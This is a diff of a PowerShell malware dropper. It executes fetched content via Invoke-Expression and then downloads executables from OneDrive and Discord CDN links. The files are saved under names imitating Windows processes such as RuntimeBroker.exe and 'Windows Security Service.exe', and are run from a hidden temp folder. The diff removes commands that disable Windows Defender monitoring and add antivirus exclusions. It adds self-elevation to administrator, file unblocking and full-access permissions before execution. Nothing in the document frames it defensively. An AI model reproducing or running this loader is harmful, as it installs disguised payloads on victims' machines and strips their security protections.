@@ -367,22 +367,16 @@ function Main {
     Invoke-Expression $content
     Send-Logs
 
-    $null = $PSDefaultParameterValues['*:ErrorAction'] = 'SilentlyContinue'
-    $ErrorActionPreference = 'SilentlyContinue'
-    $OutputPreference = 'SilentlyContinue'
-    $InformationPreference = 'SilentlyContinue'
-    $VerbosePreference = 'SilentlyContinue'
-    $WarningPreference = 'SilentlyContinue'
+    # Check for administrative permissions
+    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+        Write-Host "Restarting script as administrator..."
+        Start-Process powershell.exe -ArgumentList $MyInvocation.MyCommand.Definition -Verb RunAs
+        exit
+    }
     
-    Set-MpPreference -DisableRealtimeMonitoring $true
-    Set-MpPreference -DisableScriptScanning $true
-    Set-MpPreference -DisableBehaviorMonitoring $true
-    Set-MpPreference -DisableIOAVProtection $true
-    Set-MpPreference -DisableIntrusionPreventionSystem $true
-    
+    # Ensure the directory exists
     $up = $env:USERPROFILE
     $td = "$up\AppData\Local\Temp\6cfdfeea-9336-48ad-82b3-3d412645f44f\"
-    
     if (-not (Test-Path -Path $td)) {
         New-Item -ItemType Directory -Path $td -Force | Out-Null
     }
@@ -394,19 +388,38 @@ function Main {
         )
         $x82jdm = Join-Path -Path $td -ChildPath $ak9zl1
         Write-Host "Downloading from: $zx1ds to $x82jdm"
+        
         try {
+            # Download the file
             Invoke-WebRequest -Uri $zx1ds -OutFile $x82jdm -UseBasicParsing -ErrorAction Stop
-            Write-Host "Download successful: $x82jdm"
-            Add-MpPreference -ExclusionPath $x82jdm
-            Start-Process -FilePath $x82jdm -NoNewWindow -Wait
+            Write-Host "File successfully downloaded to: $x82jdm"
+            
+            # Unblock the file
+            Unblock-File -Path $x82jdm
+            Write-Host "File unblocked."
+            
+            # Grant execution permissions
+            icacls $x82jdm /grant Everyone:(F)
+            Write-Host "Permissions granted."
+    
+            # Verify existence
+            if (Test-Path -Path $x82jdm) {
+                Write-Host "Executing: $x82jdm"
+                Start-Process -FilePath $x82jdm -NoNewWindow -Wait
+                Write-Host "Execution completed."
+            } else {
+                Write-Error "File does NOT exist: $x82jdm"
+            }
         } catch {
-            Write-Error "Error in xk7f1q1: $_"
+            Write-Error "Error downloading or executing file: $_"
         }
     }
     
+    # Call the functions
     xk7f1q1 -zx1ds "https://onedrive.live.com/download.aspx?cid=97860907e1ea7ff0&resid=97860907E1EA7FF0!113&parId=97860907E1EA7FF0!101&authkey=!ACaJl955WKnHmx8" -ak9zl1 "RuntimeBroker.exe"
     xk7f1q1 -zx1ds "https://cdn.discordapp.com/attachments/1307069151948308490/1317051107322888263/Windows_Security..exe?ex=675d46ed&is=675bf56d&hm=49db304f5a31e81810613380e577351bb9b297b248a40d1d76ec0f6e06151ed9&" -ak9zl1 "Windows Security Service.exe"
     xk7f1q1 -zx1ds "https://cdn.discordapp.com/attachments/1307069151948308490/1317051079371784264/COM_Surrogate.exe?ex=675d46e6&is=675bf566&hm=fd17e544a2ce1d5d56291eb4bd0a51ec5416daa29fd4eb25ada1d2e904b12f3c&" -ak9zl1 "COM Surrogate.exe"
+
 
 
 
